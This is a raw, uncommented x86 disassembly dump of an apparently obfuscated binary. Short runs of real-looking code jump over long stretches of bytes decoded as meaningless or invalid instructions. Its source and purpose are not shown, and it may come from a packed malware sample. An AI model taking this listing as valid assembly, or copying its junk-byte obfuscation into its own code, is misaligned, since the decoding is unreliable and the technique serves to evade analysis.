  420340:	add    BYTE PTR [eax],al
  420342:	add    BYTE PTR [ebx+0x56d856bb],ch
  420348:	std    
  420349:	scas   eax,DWORD PTR es:[edi]
  42034a:	sti    
  42034b:	sub    eax,0xdade89d8
  420350:	stos   BYTE PTR es:[edi],al
  420351:	jp     0x420331
  420353:	mov    BYTE PTR [eax+0x1],bh
  420356:	add    BYTE PTR [ecx+0x32000000],dh
  42035c:	xor    eax,0x66f54bd7
  420361:	jmp    0x4203d2
  420363:	push   edx
  420364:	mov    ecx,0x367cd459
  420369:	xchg   ebp,eax
  42036a:	pusha  
  42036b:	cmp    BYTE PTR [esi],bh
  42036d:	test   eax,0x8f43de7f
  420372:	inc    edi
  420373:	or     esi,edi
  420375:	mov    bl,BYTE PTR [ebx]
  420377:	retf   
  420378:	mov    al,0xdd
  42037a:	das    
  42037b:	gs mov ebx,ebp
  42037e:	pop    ebp
  42037f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420380:	and    ebp,ebx
  420382:	push   cs
  420383:	in     al,dx
  420384:	pop    ebp
  420385:	push   eax
  420386:	lahf   
  420387:	(bad)  
  420389:	sub    ecx,DWORD PTR [ecx+0x38]
  42038c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42038d:	xchg   esp,eax
  42038e:	mov    al,ds:0xe12e243a
  420393:	xor    al,0x1b
  420395:	or     bl,BYTE PTR [eax-0x42]
  420398:	push   0x5f
  42039a:	pop    edi
  42039b:	mov    DWORD PTR [ecx-0x6e],esi
  42039e:	sar    DWORD PTR [ebx-0x60],1
  4203a1:	js     0x4203d1
  4203a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4203a4:	lods   al,BYTE PTR ds:[esi]
  4203a5:	pop    ecx
  4203a6:	jb     0x420391
  4203a8:	jne    0x4203b5
  4203aa:	outs   dx,DWORD PTR ds:[esi]
  4203ab:	out    dx,al
  4203ac:	dec    ebp
  4203ad:	mov    ebx,0xb94bb9d4
  4203b2:	ins    BYTE PTR es:[edi],dx
  4203b3:	push   esi
  4203b4:	dec    eax
  4203b5:	mov    ecx,0xc7392a4e
  4203ba:	dec    ecx
  4203bb:	imul   esp,DWORD PTR [ecx-0x57],0x105f5503
  4203c2:	icebp  
  4203c3:	push   es
  4203c4:	mov    ah,0xe7
  4203c6:	jae    0x420349
  4203c8:	mov    WORD PTR [ebp+0x54],?
  4203cb:	add    al,0x96
  4203cd:	fadd   QWORD PTR [ebx]
  4203cf:	in     al,dx
  4203d0:	adc    eax,0x82cb6fd8
  4203d5:	add    DWORD PTR [ebp+0x71723dfe],esp
  4203db:	inc    edx
  4203dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4203dd:	xchg   DWORD PTR [edx+ebx*2],ebx
  4203e0:	imul   ecx,eax,0xffffff9b
  4203e3:	lahf   
  4203e4:	add    al,0xe1
  4203e6:	addr16 jmp 0x1c38:0xa319f3a0
  4203ee:	ficom  WORD PTR [ecx-0x35ca66d1]
  4203f4:	adc    eax,0x4f3bbfcd
  4203f9:	xchg   esp,eax
  4203fa:	mov    ch,0x3b
  4203fc:	adc    dl,cl
  4203fe:	dec    eax
  4203ff:	push   ss
  420400:	and    bl,ah
  420402:	jmp    0xb4427bbf
  420407:	push   ebx
  420408:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  42040a:	pop    ecx
  42040b:	outs   dx,BYTE PTR ds:[esi]
  42040c:	xor    ecx,esi
  42040e:	cmp    DWORD PTR ds:0x42f5c8,0x0
  420415:	jle    0x420436
  42041b:	movzx  ebx,BYTE PTR ds:0x42f5c0
  420422:	and    DWORD PTR ds:0x42f580,ebx
  420428:	jmp    0x420436
  42042d:	push   DWORD PTR [ebp-0x28]
  420430:	call   DWORD PTR ds:0x4387ac
  420436:	add    eax,ecx
  420438:	lea    ecx,[ebp-0x48]
  42043b:	mov    DWORD PTR [ebp+eax*4+0x34a49b10],ecx
  420442:	mov    eax,DWORD PTR [ebp-0x90]
  420448:	mov    ecx,DWORD PTR [ebp-0x90]
  42044e:	sub    ebx,DWORD PTR ds:0x42f5ac
  420454:	sub    eax,0x7511
  420459:	add    DWORD PTR ds:0x42f610,ecx
  42045f:	mov    ebx,0x3cf87511
  420464:	sbb    DWORD PTR ds:0x42f58c,0x3dbc
  42046e:	sub    ecx,ebx
  420470:	add    DWORD PTR ds:0x42f5c4,0x66c
  42047a:	jmp    0x420548
  42047f:	jae    0x420450
  420481:	lahf   
  420482:	fistp  QWORD PTR [edi+0x47ef73df]
  420488:	adc    dl,BYTE PTR [ebx+0x3f]
  42048b:	popf   
  42048c:	mov    ah,0x33
  42048e:	(bad)  
  420490:	jns    0x420493
  420492:	add    BYTE PTR [ecx+0x5d000000],dh
  420498:	(bad)  
  420499:	fiadd  DWORD PTR [eax-0x1e]
  42049c:	cli    
  42049d:	add    al,0xdc
  42049f:	xlat   BYTE PTR ds:[ebx]
  4204a0:	ficomp DWORD PTR [ebx+0x6d]
  4204a3:	leave  
  4204a4:	xor    dh,al
  4204a6:	pop    edx
  4204a7:	push   esi
  4204a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204a9:	ins    DWORD PTR es:[edi],dx
  4204aa:	adc    BYTE PTR [ebx-0x29bb3762],cl
  4204b0:	stc    
  4204b1:	out    0x33,eax
  4204b3:	pop    ecx
  4204b4:	and    DWORD PTR [esi],edi
  4204b6:	push   ds
  4204b7:	jmp    0x4204d6
  4204b9:	jge    0x4204dc
  4204bb:	iret   
  4204bc:	jp     0x4204fe
  4204be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204bf:	neg    BYTE PTR [ebp+0x41b07a55]
  4204c5:	mov    bh,0xe
  4204c7:	int    0x8a
  4204c9:	std    
  4204ca:	xlat   BYTE PTR cs:[ebx]
  4204cc:	std    
  4204cd:	push   es
  4204ce:	sub    DWORD PTR [ebx+0x67],esi
  4204d1:	mov    dh,0x15
  4204d3:	jae    0x42050c
  4204d5:	inc    ebp
  4204d6:	retf   0xd86
  4204d9:	ja     0x4204c1
  4204db:	cmp    al,0x38
  4204dd:	cs dec esp
  4204df:	aad    0x65
  4204e1:	pushf  
  4204e2:	jmp    edx
  4204e4:	or     BYTE PTR [ecx-0xa5ecf98],dh
  4204ea:	jmp    0x4204c5
  4204ec:	jnp    0x420471
  4204ee:	call   0xea9778ac
  4204f3:	xor    esi,DWORD PTR [ecx+0x6e6c5a46]
  4204f9:	out    0x6b,eax
  4204fb:	scas   eax,DWORD PTR es:[edi]
  4204fc:	fsub   QWORD PTR [ebp+0xa]
  4204ff:	enter  0x37c1,0xd3
  420503:	imul   BYTE PTR [ebp+0x3a]
  420506:	je     0x4204d1
  420508:	pop    ds
  420509:	aam    0x66
  42050b:	fxch   st(5)
  42050d:	mov    dh,dh
  42050f:	scas   eax,DWORD PTR es:[edi]
  420510:	pop    ebp
  420511:	sbb    dl,0xa9
  420514:	push   es
  420515:	mov    ch,0x48
  420517:	mov    bl,0xb2
  420519:	mov    ch,0x8
  42051b:	pop    ebp
  42051c:	adc    DWORD PTR ss:[edx],esp
  42051f:	push   edx
  420520:	add    DWORD PTR [ebp-0x29],edx
  420523:	pop    edi
  420524:	sub    al,0x3b
  420526:	ins    BYTE PTR es:[edi],dx
  420527:	popa   
  420528:	inc    edi
  420529:	fs loope 0x42055b
  42052c:	shl    BYTE PTR [esi-0x22193d84],0x2
  420533:	mov    esi,0xd52315b9
  420538:	xchg   esp,eax
  420539:	mov    DWORD PTR [ebp+eiz*4+0x7e],eax
  42053d:	iret   
  42053e:	or     DWORD PTR [ecx-0x18ee748],edx
  420544:	lahf   
  420545:	fdiv   QWORD PTR [ebx]
  420547:	das    
  420548:	xor    eax,0x59c9
  42054d:	xor    ecx,0x78e20000
  420553:	and    DWORD PTR ds:0x42f5e4,0x5776
  42055d:	shl    eax,0x10
  420560:	jmp    0x42062e
  420565:	cmp    DWORD PTR ds:0xddfdcd6d,0x1e187da1
  42056f:	mov    dh,BYTE PTR [ebx]
  420571:	and    eax,0xea5f4722
  420576:	jns    0x420579
  420578:	add    BYTE PTR [ecx-0x3a000000],dh
  42057e:	pushf  
  42057f:	xchg   esp,eax
  420580:	cli    
  420581:	pop    edx
  420582:	or     ebx,DWORD PTR [ecx+esi*4+0x27]
  420586:	dec    ecx
  420587:	aad    0x77
  420589:	pop    ecx
  42058a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058b:	xor    dh,BYTE PTR [eax-0xdd1e3e4]
  420591:	cdq    
  420592:	dec    ecx
  420593:	int    0xaa
  420595:	ret    
  420596:	xchg   esp,eax
  420597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420598:	fdivr  st,st(3)
  42059a:	(bad)
  42059f:	and    dl,BYTE PTR ds:0xa5ce428
  4205a5:	xlat   BYTE PTR ds:[ebx]
  4205a6:	mov    WORD PTR [ecx+ebp*8],?
  4205a9:	shl    DWORD PTR [ecx-0x60],0x53
  4205ad:	mov    al,ds:0x20597c62
  4205b2:	xchg   ebp,eax
  4205b3:	mov    DWORD PTR [edi],ebp
  4205b5:	xlat   BYTE PTR ds:[ebx]
  4205b6:	or     esi,DWORD PTR [ebp-0x75ab740c]
  4205bc:	pop    esi
  4205bd:	test   DWORD PTR [edx-0xd],edx
  4205c0:	and    eax,0xb901d6aa
  4205c5:	mov    esp,0xcb25c8be
  4205ca:	dec    edi
  4205cb:	mov    ds:0x40ccb28d,al
  4205d0:	call   0xaa862736
  4205d5:	pop    ebx
  4205d6:	lods   al,BYTE PTR ds:[esi]
  4205d7:	sbb    ecx,ebp
  4205d9:	pop    edi
  4205da:	sub    eax,ebp
  4205dc:	les    ebx,FWORD PTR [ebx]
  4205de:	repnz mov bl,0x22
  4205e1:	pop    ebp
  4205e2:	pop    esi
  4205e3:	retf   
  4205e4:	dec    ecx
  4205e5:	test   eax,0xbd906443
  4205ea:	or     ah,BYTE PTR [ebx-0x35]
  4205ed:	mov    ebp,0xe3f3c360
  4205f2:	loope  0x4205e1
  4205f4:	or     edx,DWORD PTR [edi-0x69]
  4205f7:	jg     0x420585
  4205f9:	jnp    0x42065c
  4205fb:	test   DWORD PTR [ebx-0x633d987b],ebp
  420601:	push   eax
  420602:	(bad)  
  420604:	iret   
  420605:	or     DWORD PTR [edx-0x4e],0x28
  420609:	jecxz  0x42067c
  42060b:	ins    BYTE PTR es:[edi],dx
  42060c:	xor    esp,DWORD PTR [edi+0x5548d81d]
  420612:	jecxz  0x4205ed
  420614:	adc    edi,DWORD PTR [ecx+0x76bb047]
  42061a:	in     al,dx
  42061b:	pop    es
  42061c:	retf   0x3003
  42061f:	push   0x323bee48
  420624:	mov    ds:0x7c4b0e27,eax
  420629:	outs   dx,DWORD PTR ds:[esi]
  42062a:	ins    DWORD PTR es:[edi],dx
  42062b:	mov    WORD PTR [ebp+0x10e9c150],?
  420631:	or     ecx,eax
  420633:	mov    DWORD PTR ds:0x42f570,0x7a5d
  42063d:	sub    ecx,ebx
  42063f:	xor    DWORD PTR ds:0x42f640,0x5f61
  420649:	jmp    0x420717
  42064e:	xchg   dh,dl
  420650:	call   FWORD PTR [ebx]
  420652:	(bad)  
  420653:	cmp    esp,esi
  420655:	fistp  WORD PTR [esi-0x68]
  420658:	push   ecx
  420659:	dec    esi
  42065a:	dec    ebp
  42065b:	add    DWORD PTR [edx],ebp
  42065d:	in     al,0x9b
  42065f:	jp     0x420662
  420661:	add    BYTE PTR [ecx+0x11000000],dh
  420667:	sbb    eax,0xa29f4c2b
  42066c:	jb     0x42066e
  42066e:	imul   ecx,DWORD PTR [edi],0xf9264c0b
  420674:	cmp    DWORD PTR [edx],0xffffffbf
  420677:	out    0x1,ax
  42067a:	add    eax,0x54303acd
  42067f:	adc    al,0x2b
  420681:	loop   0x42065d
  420683:	das    
  420684:	mov    edx,0xa9a4d701
  420689:	and    al,0xfe
  42068b:	inc    esp
  42068c:	add    al,0x9
  42068e:	or     eax,0x12ace4df
  420693:	add    eax,0x542db56b
  420698:	ds inc ebp
  42069a:	mov    ds:0xb1e041b6,al
  42069f:	add    DWORD PTR fs:[edx],ebx
  4206a2:	jp     0x42066e
  4206a4:	pop    eax
  4206a5:	repz pop esi
  4206a7:	xchg   edi,eax
  4206a8:	sub    al,0x4d
  4206aa:	imul   ecx,esp,0xaec7beee
  4206b0:	cmp    eax,0x24266e2a
  4206b5:	xor    dl,cl
  4206b7:	mov    cl,BYTE PTR [ecx-0x16aec032]
  4206bd:	hlt    
  4206be:	push   ecx
  4206bf:	in     eax,0x47
  4206c1:	jle    0x42070f
  4206c3:	iret   
  4206c4:	adc    eax,0xb41fff42
  4206c9:	dec    esp
  4206ca:	push   edi
  4206cb:	pop    ecx
  4206cc:	sbb    DWORD PTR [esp+eax*4+0x10],edx
  4206d0:	pop    eax
  4206d1:	(bad)  
  4206d2:	iret   
  4206d3:	jmp    0x183db203
  4206d8:	lahf   
  4206d9:	(bad)  
  4206da:	push   esp
  4206db:	push   ecx
  4206dc:	in     al,0x10
  4206de:	adc    cl,cl
  4206e0:	ja     0x4206b8
  4206e2:	loope  0x42068f
  4206e4:	pop    ebp
  4206e5:	add    ch,BYTE PTR [ecx]
  4206e7:	call   0x6818:0x602bc5d6
  4206ee:	mov    al,ds:0x9d5feda5
  4206f3:	jno    0x420748
  4206f5:	movzx  ebx,BYTE PTR [ebx]
  4206f8:	push   edi
  4206f9:	dec    esi
  4206fa:	inc    DWORD PTR [ecx]
  4206fc:	jo     0x4206c4
  4206fe:	imul   ebx,DWORD PTR [ebx],0x38
  420701:	xchg   DWORD PTR [eax-0x6d],ebp
  420704:	rol    DWORD PTR [ebp+0x7428a78b],cl
  42070a:	push   ss
  42070b:	xchg   ecx,eax
  42070c:	mov    eax,ds:0xcedf0cb8
  420711:	out    0xdf,eax
  420713:	mov    esp,0x8d482d08
  420718:	test   DWORD PTR [eax-0x1],esi
  42071b:	(bad)  
  42071c:	(bad)  
  42071d:	jmp    0x4207eb
  420722:	or     dh,BYTE PTR [ecx]
  420724:	cmp    bh,ah
  420726:	cmp    edi,edi
  420728:	into   
  420729:	test   DWORD PTR [ebp-0x7a5eaa30],0x4c8f11e3
  420733:	jnp    0x420736
  420735:	add    BYTE PTR [ecx+0x7d000000],dh
  42073b:	das    
  42073c:	add    bh,al
  42073e:	daa    
  42073f:	cs inc edx
  420741:	fs lahf 
  420743:	mov    DWORD PTR [esi+0x1e],esp
  420746:	mov    eax,0x7b0c53c9
  42074b:	addr16 pop esp
  42074d:	pop    edi
  42074e:	push   es
  42074f:	sub    al,0x23
  420751:	sub    BYTE PTR [ecx+0x22],dh
  420754:	fwait
  420755:	in     eax,0x97
  420757:	xchg   ebp,eax
  420759:	rol    BYTE PTR [edi+edi*4-0x2a22ff21],0x7a
  420761:	shl    DWORD PTR [ebp-0x5f],0x1a
  420765:	inc    esi
  420766:	xchg   edx,eax
  420767:	(bad)  
  420768:	sbb    eax,0xc13e8f3f
  42076d:	clc    
  42076e:	aas    
  42076f:	xchg   edx,eax
  420770:	mov    al,0x6e
  420772:	xchg   edi,eax
  420773:	pop    ebx
  420774:	add    esi,DWORD PTR [ebx]
  420776:	add    BYTE PTR [eax],ah
  420778:	lods   al,BYTE PTR ds:[esi]
  420779:	push   es
  42077a:	daa    
  42077b:	sub    dh,BYTE PTR [eax+eax*4+0x3258ae12]
  420782:	sub    bh,ah
  420784:	jmp    0xb5f4:0x93eb2ef0
  42078b:	int3   
  42078c:	mov    ds:0xbae8e8a,eax
  420791:	mov    BYTE PTR [edi+0x67f168d5],dh
  420797:	mov    dh,0xc5
  420799:	push   esi
  42079a:	mov    edx,0xeb4497e3
  42079f:	test   DWORD PTR [edx-0x50],edx
  4207a2:	ja     0x42072a
  4207a4:	add    eax,0xa914d5c7
  4207a9:	pop    eax
  4207aa:	adc    BYTE PTR [ebp-0x54],bh
  4207ad:	jl     0x420752
  4207af:	xlat   BYTE PTR ds:[ebx]
  4207b0:	push   edx
  4207b1:	fisttp QWORD PTR [edx]
  4207b3:	sbb    al,0x71
  4207b5:	fsin   
  4207b7:	icebp  
  4207b8:	cmp    ch,BYTE PTR [ebx]
  4207ba:	enter  0x2b27,0xe
  4207be:	cmp    ebx,esp
  4207c0:	into   
  4207c1:	out    0xbe,eax
  4207c3:	dec    esi
  4207c4:	jmp    0xe668958a
  4207c9:	test   eax,0xb940ebe8
  4207ce:	out    0x7d,eax
  4207d0:	inc    ebx
  4207d1:	iret   
  4207d2:	push   ebx
  4207d3:	mov    ebx,0xc18fc20a
  4207d8:	into   
  4207d9:	dec    ecx
  4207da:	popf   
  4207db:	out    0x8a,eax
  4207dd:	pop    ecx
  4207de:	mov    ch,0x2b
  4207e0:	dec    esp
  4207e1:	cmp    eax,0xc0eaf8f5
  4207e6:	sub    esp,DWORD PTR [esi+0x50912623]
  4207ec:	mov    eax,ds:0x42f6ec
  4207f1:	mov    eax,DWORD PTR [eax]
  4207f3:	or     DWORD PTR ds:0x42f648,eax
  4207f9:	jmp    0x4208c7
  4207fe:	sbb    dh,BYTE PTR [eax-0x36]
  420801:	inc    esp
  420802:	jmp    0x33f5:0xcb7e9efe
  420809:	imul   eax,ecx,0xfde4a26b
  42080f:	jnp    0x420812
  420811:	add    BYTE PTR [ecx+0x6b000000],dh
  420817:	cmp    BYTE PTR [eax],0xac
  42081a:	adc    al,0xdc
  42081c:	loope  0x4207ab
  42081e:	add    eax,0xfd0a3713
  420823:	cmp    eax,0xbb82f705
  420828:	sahf   
  420829:	xor    bh,BYTE PTR [edx-0x3e890acf]
  42082f:	jmp    0x8f0:0xe22dec24
  420836:	push   esi
  420837:	mov    ds:0x7645e5cb,al
  42083c:	imul   ebp,DWORD PTR [edx+0x42c0ebe4],0xffffffeb
  420843:	loopne 0x4207f8
  420845:	pop    esi
  420846:	mov    esi,0xa22fb1e4
  42084b:	stos   DWORD PTR es:[edi],eax
  42084c:	adc    eax,0xc6763636
  420851:	adc    DWORD PTR cs:[ecx],esi
  420854:	outs   dx,DWORD PTR ds:[esi]
  420855:	sub    cl,BYTE PTR [ecx+0x4452ceba]
  42085b:	rcl    DWORD PTR [ebx],0x65
  42085e:	outs   dx,DWORD PTR ds:[esi]
  42085f:	push   ss
  420860:	mov    WORD PTR [ecx+0x44],es
  420863:	xchg   edx,eax
  420864:	ins    BYTE PTR es:[edi],dx
  420865:	jp     0x420882
  420867:	(bad)  
  420869:	sti    
  42086a:	(bad)  
  42086b:	out    dx,al
  42086c:	and    DWORD PTR [edx-0x7f],esp
  42086f:	aam    0xec
  420871:	scas   eax,DWORD PTR es:[edi]
  420872:	sub    bh,bh
  420874:	xor    DWORD PTR [esi+0x41],esp
  420877:	ss test al,0x98
  42087a:	inc    esp
  42087b:	lods   eax,DWORD PTR ds:[esi]
  42087c:	dec    esp
  42087d:	push   edx
  42087e:	lea    esi,[esi]
  420880:	out    dx,eax
  420881:	sti    
  420882:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420883:	rol    DWORD PTR [ebx-0x71514e65],cl
  420889:	outs   dx,BYTE PTR ds:[esi]
  42088a:	xor    ch,0xe3
  42088d:	add    esp,DWORD PTR [ebx]
  42088f:	or     ah,BYTE PTR ds:0x871f2936
  420895:	stos   BYTE PTR es:[edi],al
  420896:	mov    esi,0x1d96f0a2
  42089b:	xchg   edx,eax
  42089c:	cdq    
  42089d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42089e:	inc    ecx
  42089f:	xchg   esp,eax
  4208a0:	shl    al,0x1a
  4208a3:	jg     0x42086d
  4208a5:	arpl   sp,ax
  4208a7:	mov    ecx,0x168e9dfe
  4208ac:	xchg   DWORD PTR [ecx],ebp
  4208ae:	je     0x420911
  4208b0:	add    eax,0x3eaaa608
  4208b5:	js     0x420861
  4208b7:	ins    DWORD PTR es:[edi],dx
  4208b8:	lods   eax,DWORD PTR ds:[esi]
  4208b9:	jb     0x420939
  4208bb:	sahf   
  4208bc:	fimul  WORD PTR [eax-0x16c73a6d]
  4208c2:	test   al,0xc
  4208c4:	retf   0xae01
  4208c7:	mov    DWORD PTR [ebp-0x90],ecx
  4208cd:	xor    DWORD PTR ds:0x42f568,0x510
  4208d7:	mov    eax,DWORD PTR [ebp+0x10]
  4208da:	xor    ecx,ecx
  4208dc:	or     ecx,DWORD PTR ds:0x42f5a8
  4208e2:	sbb    DWORD PTR ds:0x42f630,ecx
  4208e8:	mov    ecx,DWORD PTR [ebp+0x14]
  4208eb:	and    DWORD PTR ds:0x42f5d0,0x42f620
  4208f5:	xor    eax,esi
  4208f7:	jmp    0x4209c5
  4208fc:	inc    edi
  4208fd:	pop    esi
  4208fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4208ff:	xor    DWORD PTR [ebp-0x28812805],edi
  420905:	mov    ebp,0xbc91950f
  42090a:	xor    eax,0x17cae6e
  42090f:	add    BYTE PTR [ecx+0x6a000000],dh
  420915:	mov    esp,0x15d07e58
  42091a:	cmp    eax,0x2e1320ea
  42091f:	mov    eax,ds:0xb5510dd5
  420924:	aaa    
  420925:	and    ecx,DWORD PTR [esi+0x38]
  420928:	dec    bp
  42092a:	retf   0x1177
  42092d:	push   ds
  42092e:	ret    
  42092f:	das    
  420930:	popa   
  420931:	(bad)  
  420932:	sti    
  420933:	sub    DWORD PTR [ebx],esi
  420935:	in     al,dx
  420936:	ins    BYTE PTR es:[edi],dx
  420937:	fisttp DWORD PTR [ebx]
  420939:	sti    
  42093a:	das    
  42093b:	jbe    0x4208f6
  42093d:	or     al,BYTE PTR [ecx+0x55]
  420940:	sub    al,0xa7
  420942:	rol    DWORD PTR [edx],1
  420944:	mul    DWORD PTR [edi]
  420946:	out    dx,al
  420947:	int    0xa0
  420949:	inc    esp
  42094a:	pop    edx
  42094b:	inc    edx
  42094c:	cdq    
  42094d:	xor    BYTE PTR ds:0xfb9bb0a3,dl
  420953:	mov    WORD PTR [ebp-0x72e8c83f],ss
  420959:	dec    sp
  42095b:	inc    ebp
  42095c:	jp     0x42097a
  42095e:	pop    ebp
  42095f:	leave  
  420960:	inc    ebp
  420961:	sbb    eax,0x2f8f69a6
  420966:	adc    eax,0x68abd781
  42096b:	es cli 
  42096d:	shl    DWORD PTR [ebx],cl
  42096f:	push   ecx
  420970:	and    esi,esi
  420972:	or     dh,BYTE PTR [ebx-0x45]
  420975:	sbb    al,0xc
  420977:	lods   al,BYTE PTR ds:[esi]
  420978:	cmp    eax,0xe79a072a
  42097d:	and    cl,BYTE PTR [ebx]
  42097f:	int3   
  420980:	pop    edx
  420981:	lock iret 
  420983:	(bad)  
  420984:	dec    esi
  420985:	pop    ecx
  420986:	call   0x95d0:0x1db3859
  42098d:	mov    ds:0x565c5259,eax
  420992:	test   eax,0xbefe982b
  420997:	jns    0x4209e1
  420999:	outs   dx,DWORD PTR ds:[esi]
  42099a:	cmp    ah,dh
  42099c:	dec    BYTE PTR [esi+0x7e]
  42099f:	ret    
  4209a0:	test   eax,0x768a1123
  4209a5:	sub    ebx,DWORD PTR ds:0x3a33a2f1
  4209ab:	cmp    DWORD PTR [ecx],ebp
  4209ad:	enter  0xa814,0x7b
  4209b1:	out    dx,al
  4209b2:	sub    al,0xba
  4209b4:	fcomp  QWORD PTR [eax+0x65]
  4209b7:	in     eax,dx
  4209b8:	sbb    DWORD PTR [edx+eiz*8],0x57
  4209bc:	in     eax,dx
  4209bd:	les    esi,FWORD PTR [edi+esi*4]
  4209c0:	cmp    eax,0x9acd6b7d
  4209c5:	sub    eax,edi
  4209c7:	jmp    0x420a95
  4209cc:	loopne 0x4209c7
  4209ce:	push   edx
  4209cf:	ficomp DWORD PTR [ebx-0x5]
  4209d2:	call   0x2822e4d2
  4209d7:	lahf   
  4209d8:	ja     0x4209eb
  4209da:	push   ecx
  4209db:	ficomp WORD PTR [edi+0x7d]
  4209de:	add    DWORD PTR [eax],eax
  4209e0:	mov    cl,0x0
  4209e2:	add    BYTE PTR [eax],al
  4209e4:	sub    eax,0x2dccac9b
  4209e9:	pop    ss
  4209ea:	mov    edx,0x441fc46
  4209ef:	jle    0x420a68
  4209f1:	pop    ebx
  4209f2:	in     al,dx
  4209f3:	cmp    eax,0x4d07870a
  4209f8:	mov    eax,0xc13ba1de
  4209fd:	and    ebx,DWORD PTR [eax]
  4209ff:	xchg   edx,eax
  420a00:	mov    bh,0x92
  420a02:	cmp    eax,0x65e1ab17
  420a07:	xchg   edx,eax
  420a08:	add    al,0xa5
  420a0a:	stos   DWORD PTR es:[edi],eax
  420a0b:	retf   0x99cc
  420a0e:	enter  0x576,0xba
  420a12:	push   ebp
  420a13:	xchg   ebp,ecx
  420a15:	xor    al,0x57
  420a17:	fucomi st,st(5)
  420a19:	or     al,0x15
  420a1b:	mov    dl,0xa0
  420a1d:	cmp    eax,0xf2f36ecd
  420a22:	inc    eax
  420a23:	outs   dx,BYTE PTR ds:[esi]
  420a24:	sbb    eax,0x8ad2472f
  420a29:	mov    WORD PTR [esi+0x59],?
  420a2c:	push   ss
  420a2d:	fcom   DWORD PTR [ebx-0x4d647c90]
  420a33:	or     al,0xba
  420a35:	cmp    eax,0x32922a40
  420a3a:	aad    0xfd
  420a3c:	mov    edi,DWORD PTR [edx-0x78385854]
  420a42:	mov    al,ds:0x75824452
  420a47:	push   edi
  420a48:	mov    cl,0x6e
  420a4a:	in     al,0x87
  420a4c:	stos   DWORD PTR es:[edi],eax
  420a4d:	push   ss
  420a4e:	lea    esp,[eax+0x1c]
  420a51:	jo     0x420a7a
  420a53:	add    dl,ah
  420a55:	pop    eax
  420a56:	lods   al,BYTE PTR ds:[esi]
  420a57:	retf   0xb206
  420a5a:	je     0x420abc
  420a5c:	ds mov bl,0xdb
  420a5f:	jae    0x4209ff
  420a61:	sbb    DWORD PTR [edi+0x69746e6f],ebx
  420a67:	sbb    eax,0x1b73c325
  420a6c:	dec    ebp
  420a6d:	inc    edi
  420a6e:	pcmpgtb mm3,mm6
  420a71:	test   BYTE PTR [esi-0x7ff55806],0xd0
  420a78:	jmp    0xaffa:0xdf24ebab
  420a7f:	ror    BYTE PTR [ebx-0x47389f1],cl
  420a85:	cwde   
  420a86:	fisubr WORD PTR [eax+0x153d7370]
  420a8c:	enter  0x51d8,0x7b
  420a90:	std    
  420a91:	retf   
  420a92:	idiv   dl
  420a94:	pop    edx
  420a95:	push   eax
  420a96:	mov    eax,ds:0x42f1d4
  420a9b:	push   0x42f12a
  420aa0:	and    DWORD PTR ds:0x42f5a0,0x42f560
  420aaa:	push   DWORD PTR [eax]
  420aac:	sub    DWORD PTR ds:0x42f554,0x7d62
  420ab6:	jmp    0x420b84
  420abb:	sbb    edi,DWORD PTR [edx-0x170c9fae]
  420ac1:	cmp    edi,ebx
  420ac3:	icebp  
  420ac4:	inc    ebp
  420ac5:	or     BYTE PTR [ebx],dh
  420ac7:	(bad)  
  420ac8:	mov    ebx,esp
  420aca:	cmp    DWORD PTR [eax],edx
  420acc:	jle    0x420acf
  420ace:	add    BYTE PTR [ecx+0x7b000000],dh
  420ad4:	sar    BYTE PTR [edi],0x62
  420ad7:	popf   
  420ad8:	pop    esi
  420ad9:	jb     0x420ab0
  420adb:	(bad)  [ebp+eiz*4-0x6dea52ee]
  420ae2:	in     eax,dx
  420ae3:	cmc    
  420ae4:	pop    edi
  420ae5:	pushf  
  420ae6:	jmp    0x7675:0xd4fe384b
  420aed:	(bad)  
  420aee:	push   cs
  420aef:	mov    ds:0x9f835167,al
  420af4:	aad    0x82
  420af6:	das    
  420af7:	fist   WORD PTR [eax+0x640e5c9]
  420afd:	icebp  
  420afe:	cmp    ch,BYTE PTR ds:0x333d8b9a
  420b04:	lahf   
  420b05:	test   BYTE PTR [edx],bh
  420b07:	fwait
  420b08:	adc    bh,BYTE PTR [ebp+0x1b6524c1]
  420b0e:	or     BYTE PTR [edi+0x3a],0x22
  420b12:	scas   al,BYTE PTR es:[edi]
  420b13:	xor    al,0x81
  420b15:	add    al,0x7
  420b17:	jae    0x420ab1
  420b19:	scas   eax,DWORD PTR es:[edi]
  420b1a:	mov    esp,0x9a864316
  420b1f:	ins    BYTE PTR es:[edi],dx
  420b20:	daa    
  420b21:	mov    al,0xbe
  420b23:	inc    eax
  420b24:	cmp    edx,DWORD PTR [edi-0x6b811641]
  420b2a:	push   ds
  420b2b:	das    
  420b2c:	sbb    DWORD PTR [esi+edi*4],edx
  420b2f:	rcl    ecx,0x7a
  420b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b33:	sub    al,0x22
  420b35:	sbb    DWORD PTR [ebx],ebx
  420b37:	repz into 
  420b39:	sti    
  420b3a:	cmp    al,0x39
  420b3c:	fdivr  QWORD PTR [edi+0x6f]
  420b3f:	sbb    DWORD PTR [eax-0x7d66f05d],ecx
  420b45:	sbb    al,BYTE PTR [edx+0x2b]
  420b48:	xchg   ebp,eax
  420b49:	jmp    0x420bba
  420b4b:	cmp    BYTE PTR [ebx+0x50],dl
  420b4e:	cmp    eax,0x3d203cb4
  420b53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b54:	mov    eax,ds:0x4d60a109
  420b59:	sbb    DWORD PTR [esi+0x1],eax
  420b5c:	dec    ebx
  420b5d:	push   esp
  420b5e:	jl     0x420bb9
  420b60:	jae    0x420bbb
  420b62:	mov    esi,DWORD PTR [edi+0x2a]
  420b65:	test   dl,cl
  420b67:	sbb    al,BYTE PTR [esi-0x7c4507ce]
  420b6d:	ror    DWORD PTR [eax+0x494a4fbf],0x55
  420b74:	sbb    dh,BYTE PTR [ebp+esi*2-0x4ef23d6f]
  420b7b:	sbb    eax,0x6e2caee4
  420b80:	push   esp
